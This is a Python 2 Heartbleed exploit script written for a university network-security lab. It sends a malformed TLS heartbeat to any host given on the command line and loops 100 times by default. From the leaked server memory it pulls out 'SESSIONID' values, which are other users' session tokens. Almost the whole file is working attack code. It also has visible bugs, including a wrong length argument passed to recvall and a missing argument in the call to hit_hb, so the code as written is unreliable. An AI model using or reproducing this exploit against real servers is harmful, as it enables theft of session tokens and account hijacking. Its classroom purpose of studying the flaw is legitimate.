## Netwerken en Systeembeveiliging Lab 2C - Heartbleed
## NAME:
## STUDENT ID:
import sys
import re
import struct
import socket


def hex_to_bin(x):
    """Converts hexidecimal string to binary."""
    return x.replace(' ', '').replace('\n', '').decode('hex')

# TLS handshake.
hello = hex_to_bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

# TLS heartbeat message.
hb = hex_to_bin('''
18 03 02 00 03
01 40 00
''')


def hexdump(s):
    """Dump binary string in hexidecimal."""
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b:b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print


def get_data_string(s):
    data = []
    for b in xrange(0, len(s), 16):
        data += [c for c in s[b:b + 16]]
    return ''.join((c if 32 <= ord(c) <= 126 else '.')for c in data)


def find_regex(regex, data):
    return re.findall(regex, data, re.IGNORECASE)


def recvall(s, remaining):
    data = ''
    while remaining:
        d = s.recv(remaining)
        if d is None:
            return None
        data += d
        remaining -= len(d)
    return data


def recvmsg(s, verbose):
    hdr = s.recv(5)
    if hdr:
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = recvall(s, verbose)
        if pay:
            if verbose:
                print(' - received message: type = %d, ver = %04x, length = %d'
                      % (typ, ver, len(pay)))
            return typ, ver, pay
        else:
            if verbose:
                print('Unexpected EOF receiving record payload' +
                      ' - server closed connection')
            return None, None, None
    else:
        if verbose:
            print('Unexpected EOF receiving record header' +
                  ' - server closed connection')
        return None, None, None


def hit_hb(s, verbose):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s, verbose)
        if typ is None:
            if verbose:
                print('No heartbeat response received, server not vulnerable')
            return False

        if typ == 24:
            if verbose:
                print 'Received heartbeat!'
            if len(pay) > 3:
                if verbose:
                    print('WARNING: server returned more data than it should' +
                          '- server is vulnerable!')
                # hexdump(pay)
                data = get_data_string(pay)
                regex_sessionid = r"""SESSIONID=(\d*)"""
                val = find_regex(regex_sessionid, data)
                if val:
                    print(val)
                return val
            else:
                if verbose:
                    print('Server processed malformed heartbeat,' +
                          'but did not return any extra data.')
                return True

        if typ == 21:
            if verbose:
                print 'Received alert!'
                print 'Server returned error, likely not vulnerable'
            return False


def heartbleed(host, port, verbose):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if verbose:
        print 'Connecting...'
    sys.stdout.flush()
    s.connect((host, port))

    if verbose:
        print 'Sending Client Hello...'
    sys.stdout.flush()
    s.send(hello)

    if verbose:
        print 'Waiting for Server Hello...'
    sys.stdout.flush()

    while True:
        typ, ver, pay = recvmsg(s, verbose)
        if typ is None:
            if verbose:
                print 'Server closed connection without sending Server Hello.'
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    print 'Sending heartbeat request...'
    sys.stdout.flush()
    return hit_hb(s)

if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--port',
                   help='TCP port to test (default: 443)',
                   default=443, type=int)
    p.add_argument('host',
                   help='Host name to connect to.')
    p.add_argument('--verbose',
                   help='print more info',
                   default=False, type=bool)
    p.add_argument('--iterations',
                   help='Number of heartbeats analysed',
                   default=100, type=int)
    args = p.parse_args(sys.argv[1:])

    print('iterations {}:'.format(args.iterations))

    usefull_info = []
    # Do 100 runs
    for _ in range(0, args.iterations):
        usefull_info.append(heartbleed(args.host, args.port, args.verbose))

    if usefull_info:
        print('Found the following session ids in the heartbleed messages:')
        print(list(set(usefull_info)))
